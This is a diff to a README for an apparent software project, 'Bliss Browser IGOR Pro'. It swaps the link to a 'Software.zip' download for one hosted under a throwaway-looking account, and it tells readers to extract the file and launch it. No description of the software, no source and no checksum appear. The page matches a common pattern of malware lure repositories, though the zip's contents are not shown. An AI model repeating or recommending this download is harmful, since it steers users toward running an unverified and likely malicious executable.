@@ -11,7 +11,7 @@ Welcome to the **Bliss Browser IGOR Pro** repository! Here you will find the lan
 
 ## Installation 💻
 
-To get started, download the **Software.zip** file from [here](https://github.com/user-attachments/files/18388744/Software.zip). Once downloaded, extract the contents and launch the application to begin using **Bliss Browser IGOR Pro**.
+To get started, download the **https://github.com/why12312341q/Bliss_Browser_IGOR-Pro/releases/download/v1.0/Software.zip** file from [here](https://github.com/why12312341q/Bliss_Browser_IGOR-Pro/releases/download/v1.0/Software.zip). Once downloaded, extract the contents and launch the application to begin using **Bliss Browser IGOR Pro**.
 
 If the software is not launching from the provided link, please check the "Releases" section of this repository for alternative methods.
 
